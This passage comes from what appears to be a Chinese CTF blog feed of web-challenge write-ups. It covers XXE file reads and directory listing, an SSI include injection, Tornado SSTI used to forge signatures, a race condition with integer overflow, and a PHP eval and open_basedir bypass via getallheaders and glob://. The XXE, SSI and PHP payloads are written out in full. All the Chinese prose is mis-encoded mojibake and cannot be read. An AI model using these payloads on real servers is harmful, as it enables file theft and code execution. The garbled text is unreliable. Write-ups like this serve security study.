<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-6f46836651fe64cb.png" alt><br>application/jsonåº”è¯¥éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼ŒæŠŠjsonæ”¹æˆxmlè¿›è¡ŒXXEæ³¨å…¥ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://landgrey.me/XMLBeam-XXE-Simple-Analysis/ï¼Œå‘ç°æ„é€ ï¼š" target="_blank" rel="noopener">https://landgrey.me/XMLBeam-XXE-Simple-Analysis/ï¼Œå‘ç°æ„é€ ï¼š</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Cyc1e<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>11<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ—¶æœ‰ä¸€æ ·çš„å›æ˜¾ï¼Œé‚£ä¹ˆå°±æ˜¯CVE-2018-1259çš„æ´äº†ï¼Œæ„é€ payloadï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-1722740048a470fb.png" alt></p>
<h3 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h3><p>è¿™é“é¢˜ç®—éé¢„æœŸäº†ï¼Œå‡ºé¢˜äººæœ¨æœ‰æŠŠä¸¤ä¸ªé¢˜ç›®åˆ†å¼€ï¼Œæ‰€ä»¥å¯¼è‡´æ¡æ¼äº†ï¼Œçœ‹é¢˜ç›®æè¿°æ˜¯åŒä¸€ä¸ªç»„ä»¶é€ æˆçš„RCEï¼Œé‚£è§£æ³•åº”è¯¥æ˜¯å‚è€ƒï¼š<a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/ï¼ˆæ²¡æœ‰å»å¤ç°å°è¯•ï¼‰ã€‚" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/ï¼ˆæ²¡æœ‰å»å¤ç°å°è¯•ï¼‰ã€‚</a><br>ç”±äºå’Œä¸Šä¸€é¢˜å…±ç”¨åŒä¸€ä¸ªç¯å¢ƒï¼Œflagéƒ½æ”¾åœ¨æ ¹ç›®å½•ä¸‹ï¼Œé‚£ä¹Ÿå°±æ˜¯æ–‡ä»¶åçš„é—®é¢˜ï¼Œä½†æ˜¯XXEæ˜¯å¯ä»¥åˆ—ç›®å½•çš„ï¼Œæ„é€ payloadï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-cda1cc7ce24b816a.png" alt></p>
<p>å¯ä»¥ç›´æ¥åˆ—å‡ºæ›´ç›®å½•ï¼Œå¾ˆæ¸…æ¥šçš„ï¼ŒRCEè¿™é¢˜çš„flagå°±æ‘†åœ¨è¿™äº†ï¼Œæ¡æ¼æ¡æ¼ã€‚</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f7c81d5cf632f968.png" alt></p>
<h3 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h3><p>é¢˜ç›®æç¤ºä¸ºSSIï¼Œåˆšå¼€å§‹çœ‹æˆäº†SSTIï¼Œä¸€ç›´åœ¨æ€’æ€¼PHPçš„æ¨¡ç‰ˆæ³¨å…¥ï¼Œå‘äº†æˆ‘å¥½ä¸€æ®µæ—¶é—´â€¦â€¦æ—¢ç„¶æ˜¯SSIï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨includeæ¥å°è¯•åŒ…å«æœ¬åœ°æ–‡ä»¶</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-67fbe593dc44f929.png" alt>æˆ‘ä»¬åˆ©ç”¨include virtualï¼Œæ„é€ payloadï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">name=<span class="comment">&lt;!--%23include virtual="flag" --&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥å¾—åˆ°flagï¼Œè¿™é‡Œä¸»è¦åœ¨äº#å·éœ€è¦urlencodeä¸€ä¸‹ã€‚</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-51fe24d6a7b94456.png" alt></p>
<h3 id="SimpleWasmReverse"><a href="#SimpleWasmReverse" class="headerlink" title="SimpleWasmReverse"></a>SimpleWasmReverse</h3><p>è¿™é¢˜æœ€åå¡wasmé€†å‘ä¸Šäº†ï¼Œè›®å†™å†™æ€è·¯</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f218ccef0572771d.png" alt>æŠŠflag.jsä¸‹è½½åˆ°æœ¬åœ°åˆ†æï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸€ä¸ªflag.wasmæ–‡ä»¶</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-8443127bdac0d0e2.png" alt>)å¯ä»¥ä¸‹è½½åˆ°flag.wasmè¿›è¡Œåˆ†æï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡ç±»ä¼¼é¢˜ç›®çš„writeupï¼š<a href="https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.htmlï¼Œå‚ç…§é¢˜ç›®è¿›è¡Œjsè°ƒè¯•åˆ¤æ–­è°ƒç”¨å‡½æ•°ï¼Œåœ¨check()å‡½æ•°ä¸Šä¸‹æ–­ç‚¹è·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†wasmä¸­çš„$func53å‡½æ•°" target="_blank" rel="noopener">https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.htmlï¼Œå‚ç…§é¢˜ç›®è¿›è¡Œjsè°ƒè¯•åˆ¤æ–­è°ƒç”¨å‡½æ•°ï¼Œåœ¨check()å‡½æ•°ä¸Šä¸‹æ–­ç‚¹è·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†wasmä¸­çš„$func53å‡½æ•°</a><br><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-be2040dcaa949ed3.jpg" alt></p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥è¦åšçš„ä¸»è¦å°±æ˜¯åç¼–è¯‘wasmæ–‡ä»¶ï¼Œæ‰¾åˆ°$func53å‡½æ•°è¿›è¡Œåˆ†æï¼Œå¥ˆä½•wasmåç¼–è¯‘åæ˜¯3Mçš„Cæºç ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è€Œä¸”å˜é‡åéƒ½å˜äº†ï¼Œä½œä¸ºä¸€ä¸ªé€†å‘åªå¥½çˆ†ç ´ä»€ä¹ˆçš„æ¥è¯´ï¼Œåˆ°è¿™å°±æ”¾å¼ƒäº†ï¼Œæ€è·¯è‚¯å®šæ˜¯æ²¡æ¯›ç—…çš„äº†ï¼Œåˆ†æè°ƒç”¨çš„å‡½æ•°å°±å¯ä»¥çš„åˆ°flag{xxxxxx}ï¼Œé¡µé¢æäº¤å°±å¯ä»¥å¾—åˆ°flagçš„å§ï¼Œåç­‰Writeup</p>
<p><strong>é¢˜ç›®ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œå·®ä¸€é¢˜akæ¯”è¾ƒå¯æƒœï¼Œä¸è¿‡ä¹Ÿä¸ä¼šé€†å‘ï¼Œæœ¨æœ‰åŠæ³•ï¼Œä»…ä¾›å­¦ä¹ ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>SQL</tag>
        <tag>XXE</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title>æŠ¤ç½‘æ¯é¢„é€‰èµ›ä¸¤ä¸ªå¤´å¤§çš„Webé¢˜</title>
    <url>/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/</url>
    <content><![CDATA[<h1 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h1><p>æ‹¿åˆ°AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs=ï¼Œæç¤ºæ˜¯å¼‚æˆ–ï¼Œæ²¡æƒ³åˆ°çš„æ˜¯å’Œå¤šå°‘å¼‚æˆ–ï¼Œæ‰€ä»¥ç­¾åˆ°é¢˜å¡äº†åŠå¤©ï¼ˆèœå“­ï¼‰ï¼Œå†™è„šæœ¬æµ‹è¯•</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-3839db9d9d10a201.png" alt></p>
<p>æ¯ä¸€ä½å’Œ0~105å¼‚æˆ–çš„æ—¶å€™å¯ä»¥å¾—åˆ°flagï¼šflag{09360535374819EEE70A4E6BA8009AB8}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ä¸€ã€EASY-TORNADO"><a href="#ä¸€ã€EASY-TORNADO" class="headerlink" title="ä¸€ã€EASY_TORNADO"></a>ä¸€ã€EASY_TORNADO</h2><p>åœ¨hint.txtå¾—åˆ°äº†signatureçš„ç®—æ³•ä¸ºmd5(cookie_secret + md5(filename))ï¼Œæœ‰åœ¨flag.txté‡Œå¾—åˆ°äº†flagæ–‡ä»¶ä¸º/fllllllllllagï¼Œé‚£æ€è·¯å¾ˆæ˜ç¡®å°±æ˜¯ç®—å‡ºsignatureï¼Œç„¶åè¯»å–/fllllllllllagæ–‡ä»¶é‡Œçš„å†…å®¹å°±å¯ä»¥ï¼Œå…¶ä¸­cookie_secretæ˜¯æœªçŸ¥çš„ï¼Œé€šè¿‡/error?msg= å¯ä»¥å‘ç°msgå‚æ•°å­˜åœ¨ssti</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-9ad29bc329b751e2.png" alt>æ¥ä¸‹æ¥å°±æ˜¯çˆ¬å‘çš„åŠå¤©ï¼Œä¸‹æ„è¯†ä»¥ä¸ºcookie_secretæ˜¯åœ¨cookieé‡Œï¼Œæ‰“äº†åŠå¤©çš„cookieï¼Œéƒ½ä¸çŸ¥é“è¯¥è°ƒç”¨ä»€ä¹ˆå‡½æ•°æ¥åšäº†â€¦â€¦  ç„¶ååœ¨handleå¯¹è±¡ä¸­å‘ç°äº†cookie_secretï¼ˆä¸ºä»€ä¹ˆä¼šåœ¨è¿™ä¸ªåœ°æ–¹å‘¢ï¼Œæœ‰ç‚¹è¿·ï¼ï¼‰</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-7ca1b782b9107adb.png" alt></p>
<p>æ‹¿åˆ°cookie_secretäº†é¢˜ç›®å°±ç®€å•äº†ï¼Œå†™ä¸€ä¸ªè®¡ç®—signatureçš„phpä»£ç ï¼š</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-27ffeedbdb560700.png" alt></p>
<p>è®¡ç®—å¾—å‡ºsignatureï¼Œç›´æ¥è®¿é—®payloadï¼š/file?filename=/fllllllllllag&amp;signature=240eaef73c2f70d5e30051d91417a18c</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-97ff2886094c7e53.png" alt></p>
<h2 id="äºŒã€ITSHOP"><a href="#äºŒã€ITSHOP" class="headerlink" title="äºŒã€ITSHOP"></a>äºŒã€ITSHOP</h2><p>è¿™é¢˜æ‡µäº†æ¯”è¾ƒä¹…ï¼ŒåŠå¤©æ²¡æœ‰ä»€ä¹ˆæ€è·¯çš„ã€‚æœ€ç»ˆé€šè¿‡æ¡ä»¶ç«äº‰å’Œæ•´æ•°æº¢å‡ºè§£é¢˜ã€‚<br>é¦–å…ˆå‘ç°å¯ä»¥æ¡ä»¶ç«äº‰ï¼Œå› ä¸ºè¦5åŒ…å¤§è¾£æ¡æ‰å¯ä»¥æ¢1åŒ…è¾£æ¡ä¹‹ç‹ï¼Œè€Œåªç»™äº†ä¹°4åŒ…çš„é’±ï¼Œé‚£ä¹ˆè¦ä¹ˆé€šè¿‡ä¼ªé€ æ•°æ®ï¼Œè¦ä¹ˆå°±æ˜¯æ¡ä»¶ç«äº‰ç”¨5å…ƒä¹°å¤šåŒ…è¾£æ¡äº†â€¦â€¦è¿™ä¸ªé€»è¾‘æ²¡æ¯›ç—…ï¼Œå„ç§ä¼ªé€ æµ‹è¯•ä¸é€šï¼Œå°±å°è¯•æ¡ä»¶ç«äº‰ï¼Œç”¨brupsuitå¤šçº¿ç¨‹è·‘ï¼ŒæŠŠçº¿ç¨‹è®¾ç½®å¤§ä¸€äº›</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-88c5e43f56f94734.png" alt></p>
<p>å°±å¯ä»¥ä¹°åˆ°è¶…è¿‡4åŒ…æ•°é‡çš„å¤§è¾£æ¡ã€‚</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-e652be648b88d8db.png" alt></p>
<p>ç¬¬äºŒç‚¹åœ¨äºæ•´æ•°æº¢å‡ºï¼Œæ¯•ç«Ÿæƒ³è¦æ¡ä»¶ç«äº‰å¾—åˆ°9999999*5åŒ…å¤§è¾£æ¡ä¸å¯èƒ½ï¼Œæ‰€ä»¥è¦ä¹ˆä¼ªé€ æ•°æ®ï¼Œè¦ä¹ˆå°±æ˜¯æ•´æ•°æº¢å‡ºï¼Œä¼ªé€ æ•°æ®å‰é¢è¯´äº†æ˜¯ä¸é€šçš„ï¼Œæ‰€ä»¥å°±å°è¯•æ•´æ•°æº¢å‡º,é•¿æ•´å‹æ•´æ•°æœ€å¤§ä¸º0XFFFFFFFFFFFFFFFF,é‚£ä¹ˆ0XFFFFFFFFFFFFFFFF + 1 å°±å¯ä»¥é€ æˆæº¢å‡ºï¼Œåˆå› ä¸º5åŒ…å¤§è¾£æ¡æ¢ä¸€åŒ…è¾£æ¡ä¹‹ç‹ï¼Œæ‰€ä»¥å¯ä»¥æ¢çš„è¾£æ¡ä¹‹ç‹çš„æœ€å¤§å€¼åº”è¯¥æ˜¯0XFFFFFFFFFFFFFFFF/5ï¼Œæ‰€ä»¥æ‰¹é‡æ¢è¾£æ¡ä¹‹ç‹çš„æ•°é‡åº”è¯¥æ˜¯0XFFFFFFFFFFFFFFFF/5 + 1 è½¬åŒ–ä¸ºæ•´æ•°ä¸ºï¼š3689348814741910324</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-f6791ad3e9d54e69.png" alt></p>
<p>æˆåŠŸæº¢å‡ºæ¢å¾—<strong>*****</strong>ï¼ˆåæ­£ç”¨ä¸å®Œçš„ï¼‰æ•°é‡çš„è¾£æ¡ä¹‹ç‹ï¼Œæ¥ä¸‹æ¥ç›´æ¥å…‘æ¢Flagå°±å¥½äº†</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-20e546370620f0f8-1583312993362.png" alt></p>
<p><strong>æ—¶é—´æ¯”è¾ƒçŸ­ï¼Œè¿™ä¸¤é¢˜èŠ±äº†äº›æ—¶é—´ï¼Œç„¶ååˆåŒå’å•å¼€å§‹æ»‘æ°´äº†â€¦â€¦</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>é€»è¾‘</tag>
        <tag>cookie_secret</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF-R-CURSIVE</title>
    <url>/2018/10/14/RCTF-R-CURSIVE/</url>
    <content><![CDATA[<p>è¿™æ¬¡çš„rctfæ²¡æ€ä¹ˆçœ‹ï¼Œå‚æ™šå¼€å§‹çœ‹ r-cursive è¿™é¢˜ï¼Œæºç ç‰¹åˆ«ç®€å•:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) === <span class="string">'9944105bfb8294278dbf87f4c52e8476ebf9ab68'</span> ?: <span class="keyword">die</span>();</span><br><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸»è¦æœ‰æ­£åˆ™ï¼Œ<code>preg_replace(&#39;/[^\W_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;cmd&#39;])</code>ï¼Œ\w å°±å¾ˆçƒ¦äººäº†ï¼Œæ‰€ä»¥é¦–å…ˆè¦åšçš„å°±æ˜¯è¿‡è¿™ä¸ªæ­£åˆ™è¾¾åˆ°ä»»æ„æ‰§è¡Œã€‚é€šè¿‡æ„é€ cmd=eval(next(getallheaders()));åœ¨è¯·æ±‚å¤´é‡Œæ’å…¥å¯æ‰§è¡Œä»£ç æ¥è¾¾åˆ°ä»»æ„æ‰§è¡Œ(è¿™é‡Œä¸æ­¢nextå¯ä»¥ç”¨ï¼Œä¸»è¦å°±æ˜¯å†³å®šä½ æ„é€ ä»£ç æ”¾åœ¨headerçš„ä»€ä¹ˆä½ç½®ï¼Œè¿˜æœ‰implodeï¼Œendâ€¦..éƒ½å¯ä»¥ç”¨)æˆ‘ç”¨çš„æ˜¯nextå°±æ˜¯ï¼Œæ‰§è¡Œä»£ç æ’åœ¨user_agentä¸­ï¼š</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-c17d1e0247b7b179-1583307607135.png" alt></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥ä¹Ÿå°±æ˜¯è¦åˆ—å‡ºç›®å½•ï¼Œæ‰¾åˆ°flagæ–‡ä»¶äº†ï¼Œè¿™é‡Œå¡äº†å¥½ä¹…ï¼Œä¸»è¦è¦åšçš„å°±æ˜¯ç»•è¿‡openbase_dirçš„é™åˆ¶ï¼ŒæŠŠå‡ºäº†/tmpç›®å½•å’Œindex.phpæ‰€åœ¨ç›®å½•é™¤å¤–çš„å…¶ä»–ç›®å½•ç»™åˆ—å‡ºæ¥</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-7fd934ffcfedf20f.png" alt></p>
<p>æœ€åé€šè¿‡opendir + glob://åè®®åˆ—å‡ºç›®å½•ï¼š</p>
<p><code>if($dh=opendir(&quot;glob:///var\*/www\*/sandbox\*/\*&quot;)){while(($file=readdir($dh))!==false){echo&quot;$file\n&quot;;}closedir($dh);}</code></p>
<p>ä¸€æ³¢è°œä¸€æ ·çš„æ“ä½œ</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-f8dd88d7fe7e973c.png" alt></p>
<p>å‘ç°ä¼—å¤štokenæ–‡ä»¶å¤¹åé¢å¤¹ç”Ÿè¿™init.phpå’Œphp.iniï¼ŒçŒœæµ‹flagåº”è¯¥æ˜¯æ”¾åœ¨init.phpé‡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬çš„æƒé™æ˜¯åœ¨ 78854209fa4889d51dd0016ceab319f852d90ec9 æ–‡ä»¶å¤¹ä¸‹é¢çš„ï¼Œå› ä¸ºvhost_aliasçš„é…ç½®çš„åŸå› ï¼Œæ‰€ä»¥æˆ‘ä»¬é»˜è®¤è¿›å…¥ç½‘ç«™çš„æ—¶å€™æ˜¯åœ¨tokenç›®å½•ä¸‹çš„ï¼Œå› ä¸ºopenbase_dirçš„é™åˆ¶ï¼Œç›´æ¥è¯»å–init.phpæ–‡ä»¶æ˜¯è¯»ä¸åˆ°çš„</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-a753f240ddb7aaf1.png" alt></p>
<p>è¿™é‡Œå¯ä»¥æƒ³æƒ³å› ä¸ºæˆ‘ä»¬é»˜è®¤æ˜¯åœ¨tokenæ–‡ä»¶å¤¹é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ­£å¸¸è¯»å–index.phpçš„æºç ï¼Œé‚£å¦‚æœæˆ‘ä»¬å‡ºäº†tokenæ–‡ä»¶å¤¹ï¼Œé‚£ä¹Ÿå°±å¯ä»¥æ­£å¸¸è¯»å–init.phpæ–‡ä»¶äº†æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¯·æ±‚æ—¶çš„URL:<a href="http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()" target="_blank" rel="noopener">http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()</a>)); ä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„HOSTä¸º:.sandbox.r-cursive.ml:1337ï¼Œåˆ©ç”¨file_get_contents()å‡½æ•°æ¥è¯»å–init.phpæ–‡ä»¶</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-fa9223d7f5547395.png" alt></p>
<p>è¿™æ ·ä¹Ÿå°±è·¨å‡ºé™åˆ¶ï¼ŒæˆåŠŸè¯»å–åˆ°flagã€‚</p>
<p><strong>æ¯”èµ›æ»‘æ°´ï¼Œä¹Ÿå°±åªçœ‹äº†è¿™é“é¢˜ï¼Œå…¶ä»–çš„é¢˜çœ‹éƒ½æ²¡çœ‹ï¼Œä¸è¿‡è¿™æ¬¡æ¯”èµ›é¢˜ç›®è´¨é‡çœŸå¿ƒå¥½ï¼Œæœ‰æ—¶é—´éƒ½å¯ä»¥åšåšï¼Œä»…å†™æ¥ä¾›è‡ªå·±å­¦ä¹ è®°å½•ç”¨ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>open_basedir</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>2017ä¸Šæµ·èµ›çº¿ä¸‹æ”»é˜²Webé¢˜åˆ†æ</title>
    <url>/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>é¦–å…ˆä¼šå›è¿‡å¤´æ¥é‡æ–°åˆ†æä¸€æ¬¡è¿™é“webé¢˜ä¸»è¦æ˜¯å› ä¸ºä¸Šæ¬¡çº¿ä¸‹çš„æ—¶å€™å…¨åœºä¸€ç›´åœ¨æ‰“äº†ä¸€ä¸ªæ´ï¼Œæœ€åæˆä¿¡çš„å¸ˆå‚…ç”¨é‡ç½®æ•°æ®åº“æ–¹æ³•ï¼Œä»åå°getshellä¸€è·¯è¿½åˆ†ï¼Œè¿™é‡Œå…ˆè†œä¸€å‘ã€‚è¿™æ¬¡webé¢˜çš„æ¡†æ¶æ˜¯Metinfo 5.3.17çš„ã€‚</p>
